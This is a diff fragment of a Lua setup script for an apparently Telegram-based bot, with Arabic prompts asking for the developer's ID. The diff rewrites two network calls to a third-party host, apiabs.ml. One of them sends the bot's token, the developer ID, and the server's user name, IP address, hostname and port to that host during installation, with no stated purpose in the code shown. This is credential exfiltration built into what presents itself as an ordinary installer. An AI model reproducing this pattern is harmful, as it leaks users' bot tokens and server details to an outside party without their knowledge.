@@ -25,7 +25,7 @@ if not DevRio:get(Server.."IdMilanuu") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-data,res = https.request("https://apiabs.ml/Api/Milanuu/index.php?Ban=Milanuu&Info&Id="..DevId)
+data,res = https.request("https://apiabs.ml/Api/David/index.php?Ban=David&Info&Id="..DevId)
 if res == 200 then
 Abs = json:decode(data)
 if Abs.Result.Info == 'Is_Spam' then
@@ -77,7 +77,7 @@ Milanuu = DevRio:get(Server.."TokenMilanuu"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdMilanuu")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/Api/Milanuu/index.php?Get=Milanuu&DevId="..DevRio:get(Server.."IdMilanuu").."&TokenBot="..DevRio:get(Server.."TokenMilanuu").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevRio:get(Server.."IdMilanuu").."&TokenBot="..DevRio:get(Server.."TokenMilanuu").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("Milanuu.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
